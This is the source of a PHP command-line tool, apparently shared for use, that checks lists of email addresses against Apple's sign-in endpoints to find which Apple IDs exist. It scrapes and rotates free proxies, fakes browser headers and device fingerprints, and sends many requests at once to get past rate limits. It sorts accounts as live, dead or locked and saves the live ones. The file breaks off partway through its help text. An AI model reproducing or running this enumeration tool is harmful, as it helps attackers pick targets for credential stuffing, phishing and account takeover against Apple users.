<?php
/**
 * Apple ID Email Checker v4.0 - ULTRA FAST & PROFESSIONAL
 * 
 * Fitur:
 * - Multi-thread parallel processing (5-20 email bersamaan)
 * - Colorful CLI interface dengan progress bar
 * - Auto proxy grab + rotation + testing
 * - Smart retry logic
 * - Real-time statistics
 * 
 * Author  : HSFD 403
 * Version : 4.0 - ULTRA
 * 
 * Endpoint: https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true
 * Kode: -20101 DIE | -20201 LIVE | -20283 LIVE
 */

// ============================================================
// ANSI COLOR CODES
// ============================================================

class Colors
{
    const RESET = "\033[0m";
    const BLACK = "\033[0;30m";
    const RED = "\033[0;31m";
    const GREEN = "\033[0;32m";
    const YELLOW = "\033[0;33m";
    const BLUE = "\033[0;34m";
    const PURPLE = "\033[0;35m";
    const CYAN = "\033[0;36m";
    const WHITE = "\033[0;37m";
    const BBLACK = "\033[1;30m";
    const BRED = "\033[1;31m";
    const BGREEN = "\033[1;32m";
    const BYELLOW = "\033[1;33m";
    const BBLUE = "\033[1;34m";
    const BPURPLE = "\033[1;35m";
    const BCYAN = "\033[1;36m";
    const BWHITE = "\033[1;37m";
    const BGBLACK = "\033[40m";
    const BGRED = "\033[41m";
    const BGGREEN = "\033[42m";
    const BGYELLOW = "\033[43m";
    const BGBLUE = "\033[44m";
    const BGPURPLE = "\033[45m";
    const BGCYAN = "\033[46m";
    const BGWHITE = "\033[47m";
    const IBLACK = "\033[0;90m";
    const IRED = "\033[0;91m";
    const IGREEN = "\033[0;92m";
    const IYELLOW = "\033[0;93m";
    const IBLUE = "\033[0;94m";
    const IPURPLE = "\033[0;95m";
    const ICYAN = "\033[0;96m";
    const IWHITE = "\033[0;97m";
    const BIBLACK = "\033[1;90m";
    const BIRED = "\033[1;91m";
    const BIGREEN = "\033[1;92m";
    const BIYELLOW = "\033[1;93m";
    const BIBLUE = "\033[1;94m";
    const BIPURPLE = "\033[1;95m";
    const BICYAN = "\033[1;96m";
    const BIWHITE = "\033[1;97m";
    const CLEAR_LINE = "\033[2K\r";
    const UP = "\033[A";
    const DOWN = "\033[B";
    const SAVE = "\033[s";
    const RESTORE = "\033[u";

    public static function text(string $text, string $color = self::WHITE): string
    {
        return $color . $text . self::RESET;
    }

    public static function status(string $status): string
    {
        switch ($status) {
            case 'LIVE': return self::text(' LIVE ', self::BGGREEN . self::BWHITE);
            case 'DIE': return self::text(' DIE  ', self::BGRED . self::BWHITE);
            case 'LOCKED': return self::text('LOCKED', self::BGYELLOW . self::BWHITE);
            case 'ERROR': return self::text('ERROR ', self::BGPURPLE . self::BWHITE);
            default: return self::text(' ???? ', self::BGWHITE . self::BBLACK);
        }
    }

    public static function progressBar(int $done, int $total, int $width = 40): string
    {
        $percent = $total > 0 ? ($done / $total) : 0;
        $bar = floor($percent * $width);
        $barStr = self::BGBLUE . str_repeat(' ', $bar) . self::BGWHITE . str_repeat(' ', $width - $bar) . self::RESET;
        return sprintf("%s %s %s %s%d%%%s",
            $barStr,
            self::text('|', self::IWHITE),
            self::text("$done/$total", self::BCYAN),
            self::text('|', self::IWHITE),
            $percent * 100,
            self::text('%', self::BCYAN)
        );
    }
}

// ============================================================
// PROXY GRABBER
// ============================================================

class ProxyGrabber
{
    private $proxies = [];
    private $testedProxies = [];
    private $failedProxies = [];
    private $proxyIndex = 0;
    public $maxProxies = 1000;

    public function setMaxProxies(int $max): self
    {
        $this->maxProxies = max(10, $max);
        return $this;
    }

    public function fetchUrl(string $url, int $timeout = 10): ?string
    {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_FOLLOWLOCATION => true,
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result !== false ? $result : null;
    }

    public function grabAll(): array
    {
        echo Colors::text("\n ┌──────────────────────────────────────────┐\n", Colors::ICYAN);
        echo Colors::text(" │     PROXY GRABBER - Auto Fetching...     │\n", Colors::ICYAN);
        echo Colors::text(" └──────────────────────────────────────────┘\n", Colors::ICYAN);

        $all = [];

        echo Colors::text(" [*]", Colors::IYELLOW) . " ProxyScrape... ";
        $c = $this->fetchUrl('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&protocol=http&timeout=5000');
        if ($c) {
            $lines = explode("\n", trim($c));
            foreach ($lines as $l) {
                if (preg_match('/^[\d.]+:\d+$/', trim($l))) {
                    $all[] = 'http://' . trim($l);
                }
            }
        }
        echo Colors::text("OK (" . count($all) . ")\n", Colors::IGREEN);

        echo Colors::text(" [*]", Colors::IYELLOW) . " Proxifly...     ";
        $c = $this->fetchUrl('https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt');
        if ($c) {
            $lines = explode("\n", trim($c));
            foreach ($lines as $l) {
                if (preg_match('/^[\d.]+:\d+$/', trim($l))) {
                    $all[] = 'http://' . trim($l);
                }
            }
        }
        echo Colors::text("OK (" . count($all) . ")\n", Colors::IGREEN);

        echo Colors::text(" [*]", Colors::IYELLOW) . " SpeedX...       ";
        $c = $this->fetchUrl('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt');
        if ($c) {
            $lines = explode("\n", trim($c));
            foreach ($lines as $l) {
                if (preg_match('/^[\d.]+:\d+$/', trim($l))) {
                    $all[] = 'http://' . trim($l);
                }
            }
        }
        echo Colors::text("OK (" . count($all) . ")\n", Colors::IGREEN);

        $all = array_unique($all);
        shuffle($all);

        if (count($all) > $this->maxProxies) {
            $all = array_slice($all, 0, $this->maxProxies);
        }

        echo Colors::text(" [+] Total: " . count($all) . " proxies\n", Colors::BGREEN . Colors::BWHITE);

        $this->proxies = $all;
        return $all;
    }

    public function testAll(int $threads = 50): array
    {
        $total = count($this->proxies);
        if ($total === 0) return [];

        echo Colors::text("\n ┌──────────────────────────────────────────┐\n", Colors::ICYAN);
        echo Colors::text(" │        TESTING PROXIES ($threads threads)       │\n", Colors::ICYAN);
        echo Colors::text(" └──────────────────────────────────────────┘\n", Colors::ICYAN);

        $working = [];
        $batches = array_chunk($this->proxies, $threads);
        $tested = 0;

        foreach ($batches as $batch) {
            $mh = curl_multi_init();
            $handles = [];

            foreach ($batch as $i => $proxy) {
                $p = parse_url($proxy);
                $host = $p['host'] ?? '';
                $port = $p['port'] ?? 80;

                $ch = curl_init('http://httpbin.org/ip');
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 5,
                    CURLOPT_CONNECTTIMEOUT => 3,
                    CURLOPT_PROXY => "$host:$port",
                    CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_PRIVATE => $proxy,
                ]);
                curl_multi_add_handle($mh, $ch);
                $handles[] = $ch;
            }

            $running = null;
            do {
                curl_multi_exec($mh, $running);
                curl_multi_select($mh);
            } while ($running > 0);

            foreach ($handles as $ch) {
                $proxy = curl_getinfo($ch, CURLINFO_PRIVATE);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $response = curl_multi_getcontent($ch);

                if ($response !== false && $httpCode === 200) {
                    $working[] = $proxy;
                    $this->testedProxies[] = $proxy;
                } else {
                    $this->failedProxies[] = $proxy;
                }

                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
            }

            curl_multi_close($mh);
            $tested += count($batch);

            echo Colors::CLEAR_LINE;
            echo Colors::progressBar($tested, $total, 30) . " " . Colors::text("Working: " . count($working), Colors::IGREEN);
        }

        echo "\n" . Colors::text(" [+] Working proxies: " . count($working) . "/$total\n", Colors::BGREEN . Colors::BWHITE);

        $this->proxies = $working;
        return $working;
    }

    public function getNextProxy(): ?string
    {
        if (empty($this->proxies)) return null;
        $p = $this->proxies[$this->proxyIndex % count($this->proxies)];
        $this->proxyIndex++;
        return $p;
    }

    public function getAvailableCount(): int
    {
        return count($this->proxies);
    }

    public function getTested(): array
    {
        return $this->testedProxies;
    }

    public function saveToFile(string $path, ?array $proxies = null): bool
    {
        return file_put_contents($path, implode("\n", $proxies ?? $this->proxies)) !== false;
    }

    public function loadFromFile(string $path): array
    {
        if (!file_exists($path)) return [];
        $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $proxies = [];
        foreach ($lines as $l) {
            $l = trim($l);
            if (!empty($l)) {
                $proxies[] = strpos($l, '://') === false ? 'http://' . $l : $l;
            }
        }
        $this->proxies = $proxies;
        return $proxies;
    }
}

// ============================================================
// APPLE CHECKER - ULTRA FAST
// ============================================================

class AppleChecker
{
    private $initUrl = 'https://idmsa.apple.com/appleauth/auth/signin/init';
    private $checkUrl = 'https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true';
    private $proxyGrabber;
    private $useProxy = true;
    private $threads = 10;
    private $timeout = 20;
    private $results = [];
    private $liveCount = 0;
    private $dieCount = 0;
    private $lockedCount = 0;
    private $errorCount = 0;
    private $unknownCount = 0;
    private $startTime;
    private $deviceId;

    public function __construct()
    {
        $this->proxyGrabber = new ProxyGrabber();
        $this->deviceId = $this->generateDeviceId();
    }

    public function getProxyGrabber(): ProxyGrabber
    {
        return $this->proxyGrabber;
    }

    public function setThreads(int $n): self
    {
        $this->threads = max(1, min(50, $n));
        return $this;
    }

    public function setTimeout(int $s): self
    {
        $this->timeout = $s;
        return $this;
    }

    public function setUseProxy(bool $v): self
    {
        $this->useProxy = $v;
        return $this;
    }

    public function getUseProxy(): bool
    {
        return $this->useProxy;
    }

    private function generateDeviceId(): string
    {
        $d = random_bytes(16);
        $d[6] = chr(ord($d[6]) & 0x0f | 0x40);
        $d[8] = chr(ord($d[8]) & 0x3f | 0x80);
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($d), 4));
    }

    public function checkEmail(string $email, string $proxy = null): array
    {
        $result = [
            'email' => $email,
            'status' => 'ERROR',
            'status_label' => 'Error',
            'http_code' => 0,
            'error_code' => null,
            'message' => '',
            'proxy' => $proxy,
        ];

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $result['message'] = 'Invalid email';
            return $result;
        }

        $ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15';
        $fingerprint = substr(bin2hex(random_bytes(16)), 0, 32);

        $commonHeaders = [
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Accept-Encoding: identity',
            'Referer: https://appleid.apple.com/',
            'Origin: https://appleid.apple.com',
            'User-Agent: ' . $ua,
            'X-Apple-I-FD-Client-Info: {"U":"' . $ua . '","L":"en-US","Z":"GMT+07:00","V":"1.1","F":"' . $fingerprint . '"}',
            'X-Apple-I-Device-Id: ' . $this->deviceId,
            'X-Apple-Request-Context: ' . dechex(time()) . '-' . dechex(rand(1000, 9999)),
            'X-Requested-With: XMLHttpRequest',
        ];

        // STEP 1: INIT SESSION
        $ch = curl_init($this->initUrl);
        $options = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_USERAGENT => $ua,
            CURLOPT_HTTPHEADER => $commonHeaders,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_COOKIEFILE => '',
            CURLOPT_COOKIEJAR => '',
        ];

        if ($proxy && $this->useProxy) {
            $p = parse_url($proxy);
            $options[CURLOPT_PROXY] = $p['host'] . ':' . ($p['port'] ?? 80);
            $options[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
        }

        curl_setopt_array($ch, $options);
        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $respHeaders = substr($response, 0, $headerSize);
        $respBody = substr($response, $headerSize);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if (!empty($error)) {
            $result['message'] = "CURL Error: $error";
            return $result;
        }

        preg_match_all('/^Set-Cookie:\s*([^=]+)=([^;]+)/mi', $respHeaders, $cm);
        $cookies = [];
        foreach ($cm[1] as $i => $n) {
            $cookies[trim($n)] = trim($cm[2][$i]);
        }

        preg_match('/^scnt:\s*(.+)$/mi', $respHeaders, $sm);
        $scnt = isset($sm[1]) ? trim($sm[1]) : '';

        $bodyData = json_decode($respBody, true);
        $widgetKey = $bodyData['widgetKey'] ?? 'd39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d';

        $cookieStr = '';
        foreach ($cookies as $n => $v) {
            $cookieStr .= "$n=$v; ";
        }
        $cookieStr = rtrim($cookieStr, '; ');

        // STEP 2: CHECK EMAIL
        $checkHeaders = $commonHeaders;
        $checkHeaders[] = 'Content-Type: application/json';
        $checkHeaders[] = 'Cookie: ' . $cookieStr;
        $checkHeaders[] = 'X-Apple-Widget-Key: ' . $widgetKey;
        if ($scnt) {
            $checkHeaders[] = 'X-Apple-SCNT: ' . $scnt;
        }

        $payload = json_encode(['accountName' => $email]);

        $ch2 = curl_init($this->checkUrl);
        $options2 = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_USERAGENT => $ua,
            CURLOPT_HTTPHEADER => $checkHeaders,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HEADER => true,
        ];

        if ($proxy && $this->useProxy) {
            $p = parse_url($proxy);
            $options2[CURLOPT_PROXY] = $p['host'] . ':' . ($p['port'] ?? 80);
            $options2[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
        }

        curl_setopt_array($ch2, $options2);
        $response2 = curl_exec($ch2);
        $headerSize2 = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
        $respBody2 = substr($response2, $headerSize2);
        $httpCode2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
        $error2 = curl_error($ch2);
        curl_close($ch2);

        if (!empty($error2)) {
            $result['message'] = "CURL Error: $error2";
            $result['http_code'] = $httpCode2;
            return $result;
        }

        $data = json_decode($respBody2, true);
        $result['http_code'] = $httpCode2;

        if (isset($data['serviceErrors']) && is_array($data['serviceErrors'])) {
            foreach ($data['serviceErrors'] as $e) {
                $code = $e['code'] ?? '';
                $msg = $e['message'] ?? '';
                $result['error_code'] = $code;

                switch ($code) {
                    case '-20101':
                        $result['status'] = 'DIE';
                        $result['status_label'] = 'Dead/Invalid';
                        $result['message'] = $msg ?: 'Account not found';
                        break 2;
                    case '-20201':
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (2FA)';
                        $result['message'] = $msg ?: 'Account exists, 2FA required';
                        break 2;
                    case '-20283':
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (Trusted)';
                        $result['message'] = $msg ?: 'Account exists, trusted device';
                        break 2;
                    case '-20751':
                        $result['status'] = 'LOCKED';
                        $result['status_label'] = 'Locked';
                        $result['message'] = $msg ?: 'Account locked';
                        break 2;
                    default:
                        $result['status'] = 'UNKNOWN';
                        $result['status_label'] = "Code $code";
                        $result['message'] = $msg ?: "Unknown code";
                        break 2;
                }
            }
        } elseif ($httpCode2 === 200) {
            $result['status'] = 'LIVE';
            $result['status_label'] = 'Live (HTTP 200)';
            $result['message'] = 'Account exists';
        } elseif ($httpCode2 === 401) {
            $result['status'] = 'DIE';
            $result['status_label'] = 'Dead (401)';
            $result['message'] = 'Unauthorized';
        } elseif ($httpCode2 === 409) {
            $result['status'] = 'LIVE';
            $result['status_label'] = 'Live (Conflict)';
            $result['message'] = 'Needs verification';
        } elseif ($httpCode2 === 412) {
            $result['status'] = 'LIVE';
            $result['status_label'] = 'Live (Precondition)';
            $result['message'] = 'No 2FA setup';
        } elseif (in_array($httpCode2, [429, 503])) {
            $result['status'] = 'ERROR';
            $result['status_label'] = $httpCode2 === 429 ? 'Rate Limited' : 'Unavailable';
            $result['message'] = "HTTP $httpCode2";
        }

        return $result;
    }

    public function checkMultiple(array $emails): array
    {
        $this->startTime = microtime(true);
        $total = count($emails);
        $results = [];

        echo Colors::text("\n", Colors::RESET);
        echo Colors::text(" ╔══════════════════════════════════════════════════════════╗\n", Colors::BCYAN);
        echo Colors::text(" ║              APPLE ID CHECKER v4.0 - ULTRA             ║\n", Colors::BCYAN);
        echo Colors::text(" ║               Author: HSFD 403 ── 2026                 ║\n", Colors::BCYAN);
        echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n", Colors::BCYAN);

        echo Colors::text("\n ┌─────────────────────────────────────────────────────────┐\n", Colors::ICYAN);
        echo sprintf(" │ %-55s │\n", Colors::text(" Target: " . $total . " emails | Threads: " . $this->threads . " | Timeout: " . $this->timeout . "s", Colors::BWHITE));
        echo sprintf(" │ %-55s │\n", Colors::text(" Proxy: " . ($this->useProxy ? "ACTIVE (" . $this->proxyGrabber->getAvailableCount() . " available)" : "DISABLED"), $this->useProxy ? Colors::IGREEN : Colors::IRED));
        echo Colors::text(" └─────────────────────────────────────────────────────────┘\n", Colors::ICYAN);

        $batches = array_chunk($emails, $this->threads);
        $batchCount = count($batches);
        $processedCount = 0;

        foreach ($batches as $batchIndex => $batch) {
            $mh = curl_multi_init();
            $handles = [];

            foreach ($batch as $i => $email) {
                $email = trim($email);
                if (empty($email)) continue;

                $proxy = $this->useProxy ? $this->proxyGrabber->getNextProxy() : null;

                $ch = curl_init($this->checkUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode(['accountName' => $email]),
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
                    CURLOPT_HTTPHEADER => [
                        'Accept: application/json',
                        'Content-Type: application/json',
                        'Referer: https://appleid.apple.com/',
                        'X-Apple-Widget-Key: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
                    ],
                    CURLOPT_TIMEOUT => $this->timeout,
                    CURLOPT_CONNECTTIMEOUT => 10,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_PRIVATE => json_encode(['email' => $email, 'proxy' => $proxy]),
                ]);

                if ($proxy && $this->useProxy) {
                    $p = parse_url($proxy);
                    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . ($p['port'] ?? 80));
                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
                }

                curl_multi_add_handle($mh, $ch);
                $handles[] = $ch;
            }

            if (empty($handles)) continue;

            $running = null;
            do {
                curl_multi_exec($mh, $running);
                curl_multi_select($mh);
            } while ($running > 0);

            $batchResults = [];
            foreach ($handles as $ch) {
                $response = curl_multi_getcontent($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $error = curl_error($ch);
                $private = json_decode(curl_getinfo($ch, CURLINFO_PRIVATE), true);
                $email = $private['email'] ?? '';
                $proxy = $private['proxy'] ?? null;

                $result = [
                    'email' => $email,
                    'status' => 'ERROR',
                    'status_label' => 'Error',
                    'http_code' => $httpCode,
                    'error_code' => null,
                    'message' => $error ?: '',
                    'proxy' => $proxy,
                ];

                if (!empty($error)) {
                    $result['message'] = $error;
                } else {
                    $data = json_decode($response, true);
                    if (isset($data['serviceErrors']) && is_array($data['serviceErrors'])) {
                        foreach ($data['serviceErrors'] as $e) {
                            $code = $e['code'] ?? '';
                            $result['error_code'] = $code;
                            switch ($code) {
                                case '-20101':
                                    $result['status'] = 'DIE';
                                    $result['status_label'] = 'Dead/Invalid';
                                    break 2;
                                case '-20201':
                                    $result['status'] = 'LIVE';
                                    $result['status_label'] = 'Live (2FA)';
                                    break 2;
                                case '-20283':
                                    $result['status'] = 'LIVE';
                                    $result['status_label'] = 'Live (Trusted)';
                                    break 2;
                                case '-20751':
                                    $result['status'] = 'LOCKED';
                                    $result['status_label'] = 'Locked';
                                    break 2;
                                default:
                                    $result['status'] = 'UNKNOWN';
                                    $result['status_label'] = "Code $code";
                                    break 2;
                            }
                        }
                    } elseif ($httpCode === 200) {
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (200)';
                    } elseif ($httpCode === 401) {
                        $result['status'] = 'DIE';
                        $result['status_label'] = 'Dead (401)';
                    } elseif ($httpCode === 409) {
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (Conflict)';
                    } elseif (in_array($httpCode, [429, 503])) {
                        $result['status'] = 'ERROR';
                        $result['status_label'] = $httpCode === 429 ? 'Rate Limit' : 'Unavailable';
                    }
                }

                $batchResults[] = $result;

                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
            }

            curl_multi_close($mh);

            foreach ($batchResults as $r) {
                switch ($r['status']) {
                    case 'LIVE':
                        $this->liveCount++;
                        break;
                    case 'DIE':
                        $this->dieCount++;
                        break;
                    case 'LOCKED':
                        $this->lockedCount++;
                        break;
                    case 'ERROR':
                        $this->errorCount++;
                        break;
                    default:
                        $this->unknownCount++;
                        break;
                }
                $this->results[] = $r;
            }

            $processedCount += count($batchResults);
            $this->displayBatchResults($batchResults, $processedCount, $total, $batchIndex + 1, $batchCount);
        }

        $this->displayFinalSummary();
        return $this->results;
    }

    private function displayBatchResults(array $batchResults, int $processed, int $total, int $batchNum, int $totalBatches): void
    {
        $elapsed = microtime(true) - $this->startTime;
        $speed = $processed / max($elapsed, 0.1);
        $eta = $total > 0 ? ($total - $processed) / max($speed, 1) : 0;

        if ($batchNum > 1) {
            echo Colors::UP . str_repeat(Colors::CLEAR_LINE . Colors::UP, min(count($batchResults) + 3, 12));
        }

        echo Colors::CLEAR_LINE . Colors::text(" ┌─ BATCH $batchNum/$totalBatches ─────────────────────────────────────────┐\n", Colors::ICYAN);

        $displayResults = array_slice($batchResults, 0, 8);
        foreach ($displayResults as $r) {
            $proxyInfo = $r['proxy'] ? ' [' . parse_url($r['proxy'], PHP_URL_HOST) . ']' : '';
            echo Colors::CLEAR_LINE . sprintf(" │ %s %-30s %s %s\n",
                Colors::status($r['status']),
                substr($r['email'], 0, 30),
                Colors::text($r['status_label'], $r['status'] === 'LIVE' ? Colors::IGREEN : ($r['status'] === 'DIE' ? Colors::IRED : Colors::IYELLOW)),
                Colors::text($proxyInfo, Colors::IBLACK)
            );
        }

        $hidden = count($batchResults) - count($displayResults);
        if ($hidden > 0) {
            echo Colors::CLEAR_LINE . sprintf(" │ %s %s more results...\n",
                str_repeat(' ', 7),
                Colors::text("+$hidden", Colors::ICYAN)
            );
        }

        echo Colors::CLEAR_LINE . sprintf(" │ %s %s %s %s\n",
            Colors::progressBar($processed, $total, 25),
            Colors::text(sprintf("%.1f/s", $speed), Colors::BCYAN),
            Colors::text("ETA: " . gmdate("i:s", $eta), Colors::BYELLOW),
            Colors::text("Batch: $batchNum/$totalBatches", Colors::IBLACK)
        );

        echo Colors::CLEAR_LINE . Colors::text(" └─────────────────────────────────────────────────────────────────┘\n", Colors::ICYAN);
    }

    private function displayFinalSummary(): void
    {
        $elapsed = microtime(true) - $this->startTime;
        $speed = count($this->results) / max($elapsed, 0.1);

        echo Colors::text("\n\n ╔══════════════════════════════════════════════════════════╗\n", Colors::BCYAN);
        echo Colors::text(" ║                   FINAL SUMMARY                      ║\n", Colors::BCYAN);
        echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n", Colors::BCYAN);

        echo Colors::text("\n ┌─────────────────────────────────────────────────────────┐\n", Colors::ICYAN);
        echo sprintf(" │ %-10s %s %-10s %s\n",
            Colors::text("LIVE:", Colors::BGREEN . Colors::BWHITE),
            Colors::text(str_pad($this->liveCount, 5), Colors::BIGREEN),
            Colors::text("DIE:", Colors::BRED . Colors::BWHITE),
            Colors::text($this->dieCount, Colors::BIRED)
        );
        echo sprintf(" │ %-10s %s %-10s %s\n",
            Colors::text("LOCKED:", Colors::BYELLOW . Colors::BWHITE),
            Colors::text(str_pad($this->lockedCount, 5), Colors::IYELLOW),
            Colors::text("ERROR:", Colors::BPURPLE . Colors::BWHITE),
            Colors::text($this->errorCount, Colors::IPURPLE)
        );
        echo sprintf(" │ %-24s %s\n",
            Colors::text("TOTAL:", Colors::BCYAN . Colors::BWHITE),
            Colors::text(count($this->results), Colors::BCYAN)
        );
        echo Colors::text(" ├─────────────────────────────────────────────────────────┤\n", Colors::ICYAN);
        echo sprintf(" │ %-23s %s\n",
            Colors::text("⏱  Time:", Colors::BWHITE),
            Colors::text(gmdate("H:i:s", $elapsed), Colors::BCYAN)
        );
        echo sprintf(" │ %-23s %s/s\n",
            Colors::text("⚡ Speed:", Colors::BWHITE),
            Colors::text(number_format($speed, 1), Colors::BIGREEN)
        );
        echo sprintf(" │ %-23s %s\n",
            Colors::text("📊 Accuracy:", Colors::BWHITE),
            Colors::text(($this->liveCount + $this->dieCount) . "/" . count($this->results) . " (" . round(($this->liveCount + $this->dieCount) / max(count($this->results), 1) * 100) . "%)", Colors::BCYAN)
        );
        echo Colors::text(" └─────────────────────────────────────────────────────────┘\n", Colors::ICYAN);

        echo Colors::text("\n ── " . Colors::text("HSFD 403", Colors::BRED) . " ── " . Colors::text("APPLE CHECKER v4.0", Colors::BCYAN) . " ──\n\n");
    }

    public function checkFromFile(string $path): array
    {
        if (!file_exists($path)) throw new \Exception("File not found: $path");
        $emails = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $emails = array_map('trim', $emails);

        echo Colors::text(" [*] Loaded " . count($emails) . " emails from: $path\n", Colors::ICYAN);

        return $this->checkMultiple($emails);
    }

    public function getResults(): array
    {
        return $this->results;
    }

    public function getStats(): array
    {
        return [
            'total' => count($this->results),
            'live' => $this->liveCount,
            'die' => $this->dieCount,
            'locked' => $this->lockedCount,
            'error' => $this->errorCount,
            'unknown' => $this->unknownCount,
        ];
    }

    public function getLiveResults(): array
    {
        return array_filter($this->results, fn($r) => $r['status'] === 'LIVE');
    }

    public function saveResults(array $results, string $path, string $format = 'txt'): bool
    {
        switch ($format) {
            case 'csv':
                $fp = fopen($path, 'w');
                if (!$fp) return false;
                fwrite($fp, "\xEF\xBB\xBF");
                fputcsv($fp, ['Email', 'Status', 'Label', 'HTTP Code', 'Error Code', 'Message', 'Proxy']);
                foreach ($results as $r) {
                    fputcsv($fp, [$r['email'], $r['status'], $r['status_label'], $r['http_code'], $r['error_code'] ?? '', $r['message'], $r['proxy'] ?? '']);
                }
                fclose($fp);
                return true;

            case 'json':
                return file_put_contents($path, json_encode($results, JSON_PRETTY_PRINT)) !== false;

            default:
                $live = array_filter($results, fn($r) => $r['status'] === 'LIVE');
                $txt = "APPLE CHECKER REPORT\n";
                $txt .= "Author: HSFD 403\n";
                $txt .= "Date: " . date('Y-m-d H:i:s') . "\n";
                $txt .= "Total: " . count($results) . " | LIVE: " . count($live) . " | DIE: " . count(array_filter($results, fn($r) => $r['status'] === 'DIE')) . "\n\n";
                $txt .= "=== LIVE ACCOUNTS ===\n";
                foreach ($live as $r) {
                    $pi = $r['proxy'] ? ' [' . parse_url($r['proxy'], PHP_URL_HOST) . ']' : '';
                    $txt .= $r['email'] . ' | ' . $r['status_label'] . $pi . "\n";
                }
                return file_put_contents($path, $txt) !== false;
        }
    }
}

// ============================================================
// CLI MAIN
// ============================================================

if (PHP_SAPI === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
    $options = getopt('', [
        'email:', 'file:', 'output:', 'format:',
        'threads:', 'timeout:', 'no-proxy', 'proxy-file:', 'max-proxies:', 'help'
    ]);

    if (isset($options['help']) || (empty($options['email']) && empty($options['file']))) {
        echo "\n";
        echo Colors::text(" ╔══════════════════════════════════════════════════════════╗\n", Colors::BCYAN);
        echo Colors::text(" ║              APPLE ID CHECKER v4.0 - ULTRA             ║\n", Colors::BCYAN);
        echo Colors::text(" ║               Author: HSFD 403 ── 2026                 ║\n", Colors::BCYAN);
        echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n\n", Colors::BCYAN);

        echo Colors::text(" USAGE:\n", Colors::BWHITE);
        echo Colors::text("   php apple_ultra.php --file=emails.txt\n", Colors::ICYAN);
        echo Colors::text("   php apple_ultra.php --email=user@icloud.com\n", Colors::ICYAN);
        echo Colors::text("   php apple_ultra.php --file=emails.txt --threads=20 --timeout=15\n", Colors::ICYAN);
        echo Colors::text("   php apple_ultra.php --file=emails.txt --proxy-file=proxies.txt\n", Colors::ICYAN);
        echo Colors::text("   php apple_ultra.php --file=emails.txt --output=results.csv --format=csv\n\n", Colors::ICYAN);

        echo Colors::text(" OPTIONS:\n", Colors::BWHITE);
        echo Colors::text("   --email=<email>       Single email check\n", Colors::WHITE);
        echo Colors::text("   --file=<path>         Check emails from file\n", Colors::WHITE);
        echo Colors::text("   --output=<path>       Save results\n", Colors::WHITE);
        echo Colors::text("   --format=<fmt>        Output format: txt/csv/json\n", Colors::WHITE);
        echo Colors::text("   --threads=<n>         Parallel threads (1-50, default: 10)\n", Colors::WHITE);
